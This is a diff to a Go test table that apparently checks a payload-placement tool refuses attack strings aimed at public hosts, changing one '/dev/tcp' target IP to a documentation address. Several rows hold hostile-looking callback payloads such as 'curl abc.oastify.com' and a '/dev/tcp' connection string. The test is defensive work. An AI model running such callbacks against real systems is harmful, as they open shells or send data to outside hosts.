@@ -180,7 +180,7 @@ func TestPlaceRefuses(t *testing.T) {
 		{"no placement", origin(t, "r-5", "", cases.Attack, "x"), target, ReasonPlacement},
 		{"no entry of the kind", origin(t, "r-6", "json", cases.Attack, "x"), queryOnly, ReasonNoEntry},
 		{"callback", origin(t, "r-7", "query", cases.Attack, "curl abc.oastify.com"), target, ReasonPublicHost},
-		{"dev tcp", origin(t, "r-8", "query", cases.Attack, "/dev/tcp/51.15.142.164/80"), target, ReasonPublicHost},
+		{"dev tcp", origin(t, "r-8", "query", cases.Attack, "/dev/tcp/198.51.100.7/80"), target, ReasonPublicHost},
 		{"ping", origin(t, "r-9", "header", cases.Attack, "ping 8.8.8.8"), target, ReasonPublicHost},
 		{"bare name", origin(t, "r-10", "json", cases.Legit, "see www.google.com"), target, ReasonPublicHost},
 		{"mail", origin(t, "r-11", "json", cases.Legit, "write to a@mail.example.org"), target, ReasonPublicHost},
